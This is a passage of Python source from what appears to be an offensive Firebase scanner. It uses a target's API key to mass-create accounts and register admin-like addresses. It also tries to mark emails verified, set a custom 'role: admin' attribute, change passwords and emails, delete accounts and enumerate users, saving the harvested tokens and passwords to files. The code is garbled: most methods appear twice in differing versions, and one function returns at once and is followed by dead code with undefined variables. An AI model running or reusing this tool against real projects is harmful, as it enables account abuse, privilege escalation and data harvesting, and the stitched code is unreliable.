        endpoint = self.IDENTITY_TOOLKIT_UPDATE_ENDPOINT_TEMPLATE.format(api_key=api_key)
        full_payload = {"idToken": id_token, **update_payload}

        response = self._make_request('POST', endpoint, json=full_payload)

        if response and response.status_code == 200:
            print(f"{Colors.GREEN}[✓] {success_message}{Colors.ENDC}")
            # Caller might need to handle token refresh if new token is in response.json().get('idToken')
            return True
        elif response:
            print(f"{Colors.FAIL}[!] Failed to update profile: {response.status_code} - {response.text}{Colors.ENDC}")
        else:
            # _make_request already prints connection errors
            print(f"{Colors.FAIL}[!] Failed to send update profile request.{Colors.ENDC}")
        return False

    def _modify_display_name(self, id_token: str, api_key: str) -> bool:
        new_name = input(f"{Colors.BOLD}[+] Enter new display name: {Colors.ENDC}").strip()
        if not new_name:
            print(f"{Colors.WARNING}[!] Display name cannot be empty.{Colors.ENDC}")
            return False
        payload = {"displayName": new_name}
        return self._update_user_profile(id_token, api_key, payload, "Display name updated successfully.")

    def _modify_photo_url(self, id_token: str, api_key: str) -> bool:
        new_url = input(f"{Colors.BOLD}[+] Enter new photo URL: {Colors.ENDC}").strip()
        if not new_url:
            # Basic validation, could be improved (e.g. check if valid URL)
            print(f"{Colors.WARNING}[!] Photo URL cannot be empty.{Colors.ENDC}")
            return False
        payload = {"photoUrl": new_url}
        return self._update_user_profile(id_token, api_key, payload, "Photo URL updated successfully.")

    def _modify_password(self, id_token: str, api_key: str) -> bool:
        new_password = input(f"{Colors.BOLD}[+] Enter new password: {Colors.ENDC}").strip()
        if len(new_password) < 6: # Firebase default minimum
            print(f"{Colors.WARNING}[!] Password should be at least 6 characters long.{Colors.ENDC}")
            return False
        payload = {"password": new_password}
        if self._update_user_profile(id_token, api_key, payload, "Password updated successfully."):
            print(f"{Colors.YELLOW}[!] User will need to re-authenticate with the new password. The current ID token might be invalidated soon.{Colors.ENDC}")
            return True
        return False

    def _modify_email_verification(self, id_token: str, api_key: str) -> bool:
        """Intenta marcar el email como verificado, luego refresca el token y muestra el resultado."""
        print(f"{Colors.CYAN}[*] Attempting to mark email as verified...{Colors.ENDC}")
        payload = {"emailVerified": True}
        
        if self._update_user_profile(id_token, api_key, payload, "Request to mark email as verified sent."):
            # The _update_user_profile helper currently doesn't return the new token.
            # For a full check, we'd need to get the new token from the response if available,
            # then refresh it, then decode and show.
            # This is a simplification for now.
            print(f"{Colors.YELLOW}[!] Email verification status change requested. Refresh token and check profile to confirm.{Colors.ENDC}")
            # Example of how it might be extended if _update_user_profile returned the response object:
            # response_data = response.json() # Assuming _update_user_profile returned the response
            # new_id_token_from_update = response_data.get('idToken')
            # if new_id_token_from_update:
            #     refreshed_token = self._refresh_id_token(response_data.get("refreshToken"), api_key)
            #     if refreshed_token:
            #         self._decode_and_show_token(refreshed_token)
            #     else:
            #         print(f"{Colors.WARNING}[!] Could not refresh token after verification attempt to confirm change.{Colors.ENDC}")
            # else:
            #     print(f"{Colors.WARNING}[!] No new token in response to confirm email verification status change immediately.{Colors.ENDC}")
            return True
        return False

    def _modify_custom_attributes(self, id_token: str, api_key: str) -> bool:
        print(f"{Colors.CYAN}[*] Custom attributes are typically set via Admin SDKs for full effect.{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] This test will attempt to set a simple custom attribute via the user update endpoint.{Colors.ENDC}")
        attr_key = input(f"{Colors.BOLD}[+] Enter custom attribute key (e.g., 'role'): {Colors.ENDC}").strip()
        attr_value = input(f"{Colors.BOLD}[+] Enter custom attribute value (e.g., 'admin'): {Colors.ENDC}").strip()

        if not attr_key or not attr_value:
            print(f"{Colors.WARNING}[!] Attribute key and value cannot be empty.{Colors.ENDC}")
            return False

        # Custom attributes must be a JSON string as per Firebase docs for this endpoint
        custom_attributes_payload_str = json.dumps({attr_key: attr_value})
        payload = {"customAttributes": custom_attributes_payload_str}
        
        if self._update_user_profile(id_token, api_key, payload, "Request to update custom attributes sent."):
            print(f"{Colors.YELLOW}[!] Verification needed by checking the user's profile or ID token claims after refresh.{Colors.ENDC}")
            # Firebase often doesn't reflect customAttributes immediately or via this endpoint for clients.
            return True
        return False

    def _modify_email_address(self, id_token: str, api_key: str) -> bool:
        new_email = input(f"{Colors.BOLD}[+] Enter new email address: {Colors.ENDC}").strip()
        if not new_email or "@" not in new_email: # Basic validation
            print(f"{Colors.WARNING}[!] Invalid email address provided.{Colors.ENDC}")
            return False
        payload = {"email": new_email}
        if self._update_user_profile(id_token, api_key, payload, "Email address change request sent."):
            print(f"{Colors.YELLOW}[!] This action usually requires verification of the new email address. The current ID token might be associated with the old email.{Colors.ENDC}")
            return True
        return False

    def _delete_account_test(self, id_token: str, api_key: str) -> bool:
        """Tests if an account can be deleted with its own ID token."""
        # This method uses a different endpoint, so it won't use _update_user_profile
        if input(f"{Colors.RED}[!] CONFIRM: Attempt to delete account associated with the current ID token? (yes/NO): {Colors.ENDC}").lower() != 'yes':
            return False
        
        delete_endpoint = self.IDENTITY_TOOLKIT_DELETE_ENDPOINT_TEMPLATE.format(api_key=api_key)
        payload = {"idToken": id_token}
        response = self._make_request('POST', delete_endpoint, json=payload)

        if response and response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Account deletion request successful (HTTP 200).{Colors.ENDC}")
            return True
        elif response:
            print(f"{Colors.FAIL}[!] Account deletion request failed: {response.status_code} - {response.text}{Colors.ENDC}")
        else:
            # _make_request handles connection error messages
            print(f"{Colors.FAIL}[!] Failed to send account deletion request.{Colors.ENDC}")
        return False

    def _refresh_id_token(self, refresh_token: str, api_key: str) -> Optional[str]:
        """Refreshes an ID token using a refresh token."""
        refresh_endpoint = self.SECURETOKEN_REFRESH_ENDPOINT_TEMPLATE.format(api_key=api_key)
        payload = {
            "grant_type": "refresh_token",
            "refresh_token": refresh_token
        }
        # Note: This endpoint expects form-urlencoded data, not JSON.
        response = self._make_request('POST', refresh_endpoint, data=payload) 

        if response and response.status_code == 200:
            try:
                token_data = response.json()
                new_id_token = token_data.get("id_token")
                if new_id_token:
                    print(f"{Colors.GREEN}[✓] ID Token refreshed successfully.{Colors.ENDC}")
                    return new_id_token
                else:
                    print(f"{Colors.FAIL}[!] 'id_token' not found in refresh response.{Colors.ENDC}")
            except json.JSONDecodeError:
                print(f"{Colors.FAIL}[!] Failed to decode JSON from token refresh response: {response.text[:100]}{Colors.ENDC}")
        elif response:
            print(f"{Colors.FAIL}[!] Could not refresh token: {response.status_code} - {response.text}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] Failed to send token refresh request.{Colors.ENDC}")
        return None

    def _decode_and_show_token(self, id_token: str) -> None:
        """Decodes a JWT and displays its claims."""
        try:
            payload_b64 = id_token.split('.')[1]
            # Añade padding si es necesario
            payload_b64 += '=' * (-len(payload_b64) % 4)
            decoded_bytes = base64.urlsafe_b64decode(payload_b64)
            payload = json.loads(decoded_bytes)
            print(f"{Colors.CYAN}[*] JWT Claims:{Colors.ENDC}")
            for k, v in payload.items():
                print(f"  {k}: {v}")
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error al decodificar el token: {e}{Colors.ENDC}")

    def _save_user_credentials(self, user_details: Dict, filename_prefix: str, user_identifier: str) -> None:
        """
        Saves user credentials to a JSON file.
        user_details: Dictionary containing all data to be saved.
        filename_prefix: Prefix for the filename (e.g., "firebase_user_", "firebase_admin_").
        user_identifier: A unique part for the filename, like user_id or a timestamped email.
        """
        safe_identifier = re.sub(r'[^a-zA-Z0-9_.-]', '_', user_identifier) # Sanitize for filename
        creds_file = f"{filename_prefix}{safe_identifier}.json"
        
        try:
            with open(creds_file, 'w') as f:
                json.dump(user_details, f, indent=4)
            print(f"{Colors.GREEN}[✓] Credentials saved to: {creds_file}{Colors.ENDC}")
        except IOError as e:
            print(f"{Colors.FAIL}[!] Could not save credentials to {creds_file}: {e}{Colors.ENDC}")

    def _create_single_user(self, endpoint: str, api_key: str) -> None:
        """Create a single user account."""
        print(f"\n{Colors.CYAN}[*] Creating Single User Account{Colors.ENDC}")
        
        email = input(f"{Colors.BOLD}{Colors.WHITE}[+] Enter email (or press Enter for random): {Colors.ENDC}").strip()
        if not email:
            timestamp = int(time.time())
            default_domain = self.DEFAULT_EMAIL_DOMAINS[0] if self.DEFAULT_EMAIL_DOMAINS else 'example.com'
            email = f"scanner.user{timestamp}@{default_domain}"
            print(f"{Colors.YELLOW}[i] No email entered, using random: {email}{Colors.ENDC}")
            
        password = input(f"{Colors.BOLD}{Colors.WHITE}[+] Enter password (default: P@$$wOrd123!): {Colors.ENDC}").strip()
        if not password:
            password = "P@$$wOrd123!"
            print(f"{Colors.YELLOW}[i] No password entered, using default.{Colors.ENDC}")
        
        display_name = input(f"{Colors.BOLD}{Colors.WHITE}[+] Enter display name (optional): {Colors.ENDC}").strip()
        
        user_payload = {
            "email": email,
            "password": password,
            "returnSecureToken": True
        }
        if display_name:
            user_payload["displayName"] = display_name
        
        print(f"{Colors.CYAN}[*] Attempting to create user: {email}{Colors.ENDC}")
        response = self._make_request('POST', endpoint, json=user_payload, timeout=10)
            
        if response and response.status_code == 200:
            try:
                user_info = response.json()
                user_id = user_info.get('localId', 'UnknownUserID')
                id_token = user_info.get('idToken', '')
                refresh_token = user_info.get('refreshToken', '')
                
                print(f"{Colors.GREEN}[✓] User '{email}' created successfully!{Colors.ENDC}")
                print(f"    {Colors.WHITE}User ID: {user_id}{Colors.ENDC}")
                print(f"    {Colors.WHITE}ID Token (snippet): {id_token[:30]}...{Colors.ENDC}")
                print(f"    {Colors.WHITE}Refresh Token (snippet): {refresh_token[:30] if refresh_token else 'N/A'}...{Colors.ENDC}")
                
                creds_to_save = {
                    "email": email,
                    "password_attempted": password, # Note: Storing password, be mindful
                    "user_id": user_id,
                    "id_token": id_token,
                    "refresh_token": refresh_token,
                    "display_name": user_info.get("displayName", display_name if display_name else ""),
                    "photo_url": user_info.get("photoUrl", ""),
                    "email_verified": user_info.get("emailVerified", False),
                    "created_at_timestamp": time.time(),
                    "created_at_readable": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
                    "endpoint_used": endpoint
                }
                self._save_user_credentials(creds_to_save, "firebase_user_", user_id)

            except json.JSONDecodeError:
                print(f"{Colors.FAIL}[!] Failed to decode JSON response from server: {response.text[:100]}{Colors.ENDC}")
        elif response:
            print(f"{Colors.FAIL}[!] Failed to create user '{email}': {response.status_code}{Colors.ENDC}")
            try:
                error_details = response.json().get('error', {})
                print(f"    {Colors.RED}Error: {error_details.get('message', response.text)}{Colors.ENDC}")
            except json.JSONDecodeError:
                print(f"    {Colors.RED}Raw Response: {response.text[:200]}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[!] No response received from user creation request for '{email}'.{Colors.ENDC}")

    def _create_bulk_users(self, endpoint: str, api_key: str) -> None:
        """Create multiple user accounts"""
        print(f"\n{Colors.CYAN}[*] Bulk User Creation{Colors.ENDC}")
        
        try:
            count_str = input(f"{Colors.BOLD}[+] How many users to create (e.g., 10, max 50): {Colors.ENDC}").strip()
            if not count_str.isdigit():
                print(f"{Colors.FAIL}[!] Invalid number. Please enter a numeric value.{Colors.ENDC}")
                return
            count = int(count_str)
            if not (1 <= count <= 50): # Adjusted to check range properly
                print(f"{Colors.FAIL}[!] Invalid count. Must be between 1 and 50.{Colors.ENDC}")
                return
        except ValueError: # Should be caught by isdigit, but as a fallback
            print(f"{Colors.FAIL}[!] Invalid input for count.{Colors.ENDC}")
            return
        
        domain_input = input(f"{Colors.BOLD}[+] Email domain (default: {self.DEFAULT_EMAIL_DOMAINS[0] if self.DEFAULT_EMAIL_DOMAINS else 'example.com'}): {Colors.ENDC}").strip()
        domain = domain_input if domain_input else (self.DEFAULT_EMAIL_DOMAINS[0] if self.DEFAULT_EMAIL_DOMAINS else 'example.com')
        
        password_base_input = input(f"{Colors.BOLD}[+] Password base (default: HackerPass): {Colors.ENDC}").strip()
        password_base = password_base_input if password_base_input else "HackerPass"
        
        created_users_list = []
        current_timestamp_for_batch = int(time.time()) # For consistent naming of the batch file
        
        print(f"\n{Colors.CYAN}[*] Creating {count} users...{Colors.ENDC}")
        
        for i in range(count):
            email = f"bulk.scanner.{current_timestamp_for_batch}_{i}@{domain}"
            password = f"{password_base}{i}$!BulkStrong" # Slightly more complex default
            
            user_payload = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            
            print(f"{Colors.CYAN}[*] Attempting to create bulk user: {email}{Colors.ENDC}")
            response = self._make_request('POST', endpoint, json=user_payload, timeout=7)
                
            if response and response.status_code == 200:
                try:
                    user_info_resp = response.json() # Renamed to avoid conflict
                    user_id = user_info_resp.get('localId', f'unknown_bulk_{i}')
                    
                    # Prepare details for saving (individual file not saved here, but data collected)
                    user_details_for_list = {
                        "email": email,
                        "password_attempted": password,
                        "user_id": user_id,
                        "id_token": user_info_resp.get('idToken', ''),
                        "refresh_token": user_info_resp.get('refreshToken', ''),
                        "display_name": user_info_resp.get("displayName", ""),
                        "photo_url": user_info_resp.get("photoUrl", ""),
                        "email_verified": user_info_resp.get("emailVerified", False),
                        "created_at_timestamp": time.time(),
                        "created_at_readable": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
                        "endpoint_used": endpoint,
                        "bulk_batch_id": current_timestamp_for_batch
                    }
                    created_users_list.append(user_details_for_list)
                    print(f"{Colors.GREEN}[✓] Bulk user created: {email} (ID: {user_id}){Colors.ENDC}")
                except json.JSONDecodeError:
                    print(f"{Colors.FAIL}[✗] Failed to decode JSON for bulk user {email}: {response.text[:100]}{Colors.ENDC}")
            elif response:
                print(f"{Colors.FAIL}[✗] Failed to create bulk user {email}: HTTP {response.status_code} - {response.text[:100]}{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[✗] No response for bulk user {email}. Skipping.{Colors.ENDC}")
            
            time.sleep(0.7) # Slightly increased delay for bulk operations
        
        if created_users_list:
            bulk_filename = f"firebase_bulk_users_batch_{current_timestamp_for_batch}.json"
            try:
                with open(bulk_filename, 'w') as f:
                    json.dump(created_users_list, f, indent=4)
                print(f"\n{Colors.GREEN}[✓] Successfully created {len(created_users_list)} bulk users.{Colors.ENDC}")
                print(f"{Colors.GREEN}[✓] All bulk user credentials saved to: {bulk_filename}{Colors.ENDC}")
            except IOError as e:
                print(f"{Colors.FAIL}[!] Could not save bulk user credentials to {bulk_filename}: {e}{Colors.ENDC}")
        else:
            print(f"{Colors.YELLOW}[!] No users were created in this bulk operation.{Colors.ENDC}")

    def _create_admin_user(self, endpoint: str, api_key: str) -> None:
        """Attempt to create an admin-like user."""
        print(f"\n{Colors.CYAN}[*] Attempting to Create Admin-like User Account(s){Colors.ENDC}")
        
        project_domain_part = f"{self.project_id}.com" if self.project_id else "yourproject.com" # Fallback if project_id is None
        
        admin_email_candidates = [
            f"admin@{project_domain_part}", f"administrator@{project_domain_part}",
            f"root@{project_domain_part}", f"sysadmin@{project_domain_part}",
            "admin@example.com", "administrator@example.com" # More generic ones
        ]
        
        admin_password = "AdminP@$$wOrd!Secure1" # A more complex default
        admin_display_name = "System Administrator (Scanner Test)"
        
        created_any_admin = False
        for email_candidate in admin_email_candidates:
            print(f"{Colors.CYAN}[*] Trying potential admin email: {email_candidate}{Colors.ENDC}")
            
            user_payload = {
                "email": email_candidate,
                "password": admin_password,
                "displayName": admin_display_name,
                "returnSecureToken": True
            }
            
            response = self._make_request('POST', endpoint, json=user_payload, timeout=10)
                
            if response and response.status_code == 200:
                try:
                    user_info = response.json()
                    user_id = user_info.get('localId', 'UnknownAdminID')
                    id_token = user_info.get('idToken', '')
                    refresh_token = user_info.get('refreshToken', '')

                    print(f"{Colors.GREEN}[✓] Potential admin user '{email_candidate}' created successfully!{Colors.ENDC}")
                    print(f"    {Colors.WHITE}User ID: {user_id}{Colors.ENDC}")
                    
                    admin_creds_to_save = {
                        "email": email_candidate,
                        "password_attempted": admin_password,
                        "user_id": user_id,
                        "id_token": id_token,
                        "refresh_token": refresh_token,
                        "display_name": user_info.get("displayName", admin_display_name),
                        "photo_url": user_info.get("photoUrl", ""),
                        "email_verified": user_info.get("emailVerified", False),
                        "role_speculation": "potential_admin",
                        "created_at_timestamp": time.time(),
                        "created_at_readable": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
                        "endpoint_used": endpoint
                    }
                    self._save_user_credentials(admin_creds_to_save, "firebase_admin_", user_id)
                    created_any_admin = True
                    # Consider if we should break after the first success or try all candidates
                    # break 
                except json.JSONDecodeError:
                    print(f"{Colors.FAIL}[!] Failed to decode JSON response for admin candidate {email_candidate}: {response.text[:100]}{Colors.ENDC}")
                    
            elif response and response.status_code == 400:
                try:
                    error_details = response.json().get('error', {})
                    error_msg = error_details.get('message', 'Unknown error')
                    if 'EMAIL_EXISTS' in error_msg:
                        print(f"{Colors.YELLOW}[i] Admin-like email already exists: {email_candidate}{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Failed to create admin-like user {email_candidate}: {error_msg}{Colors.ENDC}")
                except json.JSONDecodeError:
                     print(f"{Colors.FAIL}[!] Failed to create admin-like user {email_candidate}, non-JSON error: {response.text[:100]}{Colors.ENDC}")
            elif response:
                print(f"{Colors.FAIL}[!] Failed to create admin-like user {email_candidate}, HTTP {response.status_code}: {response.text[:100]}{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[!] No response for admin-like user {email_candidate}. Skipping.{Colors.ENDC}")
            
            time.sleep(0.5) # Small delay

        if not created_any_admin:
            print(f"{Colors.YELLOW}[!] No admin-like user accounts were successfully created with the tested email patterns.{Colors.ENDC}")

    def _extract_user_info(self, api_key: str) -> None:
        return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "displayName": new_name, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Display name updated successfully.{Colors.ENDC}")
            # Potentially update id_token from response.json().get('idToken')
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False


    def _modify_photo_url(self, id_token: str, api_key: str) -> bool:
        new_url = input(f"{Colors.BOLD}[+] Enter new photo URL: {Colors.ENDC}").strip()
        if not new_url:
            print(f"{Colors.WARNING}[!] Photo URL cannot be empty.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "photoUrl": new_url, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Photo URL updated successfully.{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_password(self, id_token: str, api_key: str) -> bool:
        new_password = input(f"{Colors.BOLD}[+] Enter new password: {Colors.ENDC}").strip()
        if len(new_password) < 6: # Firebase default minimum
            print(f"{Colors.WARNING}[!] Password should be at least 6 characters.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "password": new_password, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Password updated successfully.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] User will need to re-authenticate with the new password. Current id_token might be invalidated soon.{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_custom_attributes(self, id_token: str, api_key: str) -> bool:
        print(f"{Colors.CYAN}[*] Custom attributes are typically set via Admin SDKs.{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] This test will attempt to set a simple custom attribute via user update endpoint.{Colors.ENDC}")
        attr_key = input(f"{Colors.BOLD}[+] Enter custom attribute key (e.g., 'role'): {Colors.ENDC}").strip()
        attr_value = input(f"{Colors.BOLD}[+] Enter custom attribute value (e.g., 'admin'): {Colors.ENDC}").strip()
        if not attr_key or not attr_value:
            print(f"{Colors.WARNING}[!] Attribute key and value cannot be empty.{Colors.ENDC}")
            return False

        custom_attributes = json.dumps({attr_key: attr_value}) # Must be a JSON string
        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "customAttributes": custom_attributes, "returnSecureToken": True}
        
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            # Firebase usually returns the customAttributes as a stringified JSON.
            # And it often doesn't reflect immediately or is only settable by admin SDK.
            print(f"{Colors.GREEN}[✓] Request to update custom attributes sent. Verification needed by checking user profile.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Response: {response.json().get('customAttributes', 'Not in response.')}{Colors.ENDC}")
            return True # Request was successful, actual change needs verification
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _modify_email_address(self, id_token: str, api_key: str) -> bool:
        new_email = input(f"{Colors.BOLD}[+] Enter new email address: {Colors.ENDC}").strip()
        if not new_email or "@" not in new_email:
            print(f"{Colors.WARNING}[!] Invalid email address.{Colors.ENDC}")
            return False

        update_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
        data = {"idToken": id_token, "email": new_email, "returnSecureToken": True}
        response = self.session.post(update_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Email address change request sent.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] This usually requires verification of the new email. Current id_token might be for the old email.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Response email: {response.json().get('email')}{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _delete_account_test(self, id_token: str, api_key: str) -> bool:
        """Tests if an account can be deleted with its own ID token."""
        if input(f"{Colors.RED}[!] CONFIRM: Attempt to delete account for token {id_token[:20]}...? (yes/NO): {Colors.ENDC}").lower() != 'yes':
            return False
            
        delete_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:delete?key={api_key}"
        data = {"idToken": id_token}
        response = self.session.post(delete_endpoint, json=data)
        if response.status_code == 200:
            print(f"{Colors.GREEN}[✓] Account deletion successful (HTTP 200).{Colors.ENDC}")
            return True
        print(f"{Colors.FAIL}[!] Account deletion failed: {response.status_code} - {response.text}{Colors.ENDC}")
        return False

    def _create_single_user(self, endpoint: str, api_key: str) -> None:
        """Create a single user account"""
        print(f"\n{Colors.CYAN}[*] Creating Single User Account{Colors.ENDC}")
        
        email = input(f"{Colors.BOLD}[+] Enter email (or press Enter for random): {Colors.ENDC}").strip()
        if not email:
            email = f"hacker{int(time.time())}@evil.com"
            
        password = input(f"{Colors.BOLD}[+] Enter password (default: HackerPass123!): {Colors.ENDC}").strip()
        if not password:
            password = "HackerPass123!"
        
        display_name = input(f"{Colors.BOLD}[+] Enter display name (optional): {Colors.ENDC}").strip()
        
        # Determine data format based on endpoint
        if "v1/accounts" in endpoint:
            user_data = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            if display_name:
                user_data["displayName"] = display_name
        else:  # v3 endpoint
            user_data = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            if display_name:
                user_data["displayName"] = display_name
        
        try:
            print(f"{Colors.CYAN}[*] Creating user: {email}{Colors.ENDC}")
            response = self.session.post(endpoint, json=user_data, timeout=10)
            
            if response.status_code == 200:
                user_info = response.json()
                user_id = user_info.get('localId', 'Unknown')
                id_token = user_info.get('idToken', '')
                refresh_token = user_info.get('refreshToken', '')
                
                print(f"{Colors.GREEN}[✓] User created successfully!{Colors.ENDC}")
                print(f"    Email: {email}")
                print(f"    User ID: {user_id}")
                print(f"    ID Token: {id_token[:50]}...")
                print(f"    Refresh Token: {refresh_token[:50]}...")
                
                # Save credentials to file
                creds_file = f"firebase_user_{user_id}.json"
                creds_data = {
                    "email": email,
                    "password": password,
                    "user_id": user_id,
                    "id_token": id_token,
                    "refresh_token": refresh_token,
                    "created_at": time.time(),
                    "endpoint": endpoint
                }
                
                with open(creds_file, 'w') as f:
                    json.dump(creds_data, f, indent=2)
                    
                print(f"{Colors.GREEN}[✓] Credentials saved to: {creds_file}{Colors.ENDC}")
                
            else:
                print(f"{Colors.FAIL}[!] Failed to create user: {response.status_code}{Colors.ENDC}")
                print(f"    Response: {response.text}")
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error creating user: {e}{Colors.ENDC}")

    def _create_bulk_users(self, endpoint: str, api_key: str) -> None:
        """Create multiple user accounts"""
        print(f"\n{Colors.CYAN}[*] Bulk User Creation{Colors.ENDC}")
        
        try:
            count = int(input(f"{Colors.BOLD}[+] How many users to create (1-50): {Colors.ENDC}"))
            if count < 1 or count > 50:
                print(f"{Colors.FAIL}[!] Invalid count{Colors.ENDC}")
                return
        except ValueError:
            print(f"{Colors.FAIL}[!] Invalid number{Colors.ENDC}")
            return
        
        domain = input(f"{Colors.BOLD}[+] Email domain (default: evil.com): {Colors.ENDC}").strip()
        if not domain:
            domain = "evil.com"
        
        password_base = input(f"{Colors.BOLD}[+] Password base (default: HackerPass): {Colors.ENDC}").strip()
        if not password_base:
            password_base = "HackerPass"
        
        created_users = []
        timestamp = int(time.time())
        
        print(f"\n{Colors.CYAN}[*] Creating {count} users...{Colors.ENDC}")
        
        for i in range(count):
            email = f"bulk{timestamp}_{i}@{domain}"
            password = f"{password_base}{i}123!"
            
            user_data = {
                "email": email,
                "password": password,
                "returnSecureToken": True
            }
            
            try:
                response = self.session.post(endpoint, json=user_data, timeout=5)
                
                if response.status_code == 200:
                    user_info = response.json()
                    user_id = user_info.get('localId', 'Unknown')
                    created_users.append({
                        "email": email,
                        "password": password,
                        "user_id": user_id,
                        "id_token": user_info.get('idToken', ''),
                        "refresh_token": user_info.get('refreshToken', '')
                    })
                    print(f"{Colors.GREEN}[✓] Created: {email} (ID: {user_id}){Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[✗] Failed: {email} - {response.status_code}{Colors.ENDC}")
                    
            except Exception as e:
                print(f"{Colors.FAIL}[✗] Error creating {email}: {e}{Colors.ENDC}")
            
            # Small delay to avoid rate limiting
            time.sleep(0.5)
        
        # Save all created users
        if created_users:
            bulk_file = f"firebase_bulk_users_{timestamp}.json"
            with open(bulk_file, 'w') as f:
                json.dump(created_users, f, indent=2)
            
            print(f"\n{Colors.GREEN}[✓] Created {len(created_users)} users{Colors.ENDC}")
            print(f"[✓] Credentials saved to: {bulk_file}{Colors.ENDC}")

    def _create_admin_user(self, endpoint: str, api_key: str) -> None:
        """Attempt to create an admin-like user"""
        print(f"\n{Colors.CYAN}[*] Creating Admin-like User{Colors.ENDC}")
        
        admin_emails = [
            "admin@company.com",
            "administrator@company.com", 
            "root@company.com",
            "support@company.com",
            "admin@" + self.project_id + ".com"
        ]
        
        for email in admin_emails:
            print(f"{Colors.CYAN}[*] Trying admin email: {email}{Colors.ENDC}")
            
            user_data = {
                "email": email,
                "password": "AdminPass123!",
                "displayName": "System Administrator",
                "returnSecureToken": True
            }
            
            try:
                response = self.session.post(endpoint, json=user_data, timeout=10)
                
                if response.status_code == 200:
                    user_info = response.json()
                    user_id = user_info.get('localId', 'Unknown')
                    
                    print(f"{Colors.GREEN}[✓] Admin user created!{Colors.ENDC}")
                    print(f"    Email: {email}")
                    print(f"    User ID: {user_id}")
                    
                    # Save admin credentials
                    admin_file = f"firebase_admin_{user_id}.json"
                    admin_data = {
                        "email": email,
                        "password": "AdminPass123!",
                        "user_id": user_id,
                        "id_token": user_info.get('idToken', ''),
                        "refresh_token": user_info.get('refreshToken', ''),
                        "role": "potential_admin",
                        "created_at": time.time()
                    }
                    
                    with open(admin_file, 'w') as f:
                        json.dump(admin_data, f, indent=2)
                    
                    print(f"{Colors.GREEN}[✓] Admin credentials saved to: {admin_file}{Colors.ENDC}")
                    return
                    
                elif response.status_code == 400:
                    error_data = response.json()
                    error_msg = error_data.get('error', {}).get('message', '')
                    if 'EMAIL_EXISTS' in error_msg:
                        print(f"{Colors.WARNING}[!] Email already exists: {email}{Colors.ENDC}")
                    else:
                        print(f"{Colors.FAIL}[!] Failed: {error_msg}{Colors.ENDC}")
                        
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error with {email}: {e}{Colors.ENDC}")
        
        print(f"{Colors.WARNING}[!] No admin emails were available{Colors.ENDC}")

    def _extract_user_info(self, api_key: str) -> None:
        """Extract comprehensive information about existing users"""
        print(f"\n{Colors.CYAN}[*] Advanced User Information Extraction{Colors.ENDC}")
        
        # Opciones de extracción
        print(f"\n{Colors.CYAN}[*] Extraction Methods:{Colors.ENDC}")
        print("1. Extract from saved tokens (basic)")
        print("2. Enumerate emails (common, single, or from file)")
        print("3. Extract from open database")
        print("4. Try User ID enumeration")
        print("5. Comprehensive extraction (all methods)")
        print("6. Export all users to file")
        
        choice = input(f"\n{Colors.BOLD}[+] Select extraction method (1-6): {Colors.ENDC}").strip()
        
        all_users = []
        
        if choice == "1" or choice == "5":
            users = self._extract_from_saved_tokens(api_key)
            all_users.extend(users)
            
        if choice == "2" or choice == "5":
            print(f"\n{Colors.CYAN}[*] Email Enumeration Options:{Colors.ENDC}")
            print("  1. Enumerate default common emails")
            print("  2. Enumerate a single email")
            print("  3. Enumerate emails from a file")
            enum_choice = input(f"{Colors.BOLD}[+] Select email enumeration type (1-3): {Colors.ENDC}").strip()

            single_email_to_check = None
            email_file_to_check = None

            if enum_choice == "2":
                single_email_to_check = input(f"{Colors.BOLD}[+] Enter the single email to check: {Colors.ENDC}").strip()
                if not single_email_to_check:
                    print(f"{Colors.FAIL}[!] No email provided.{Colors.ENDC}")
            elif enum_choice == "3":
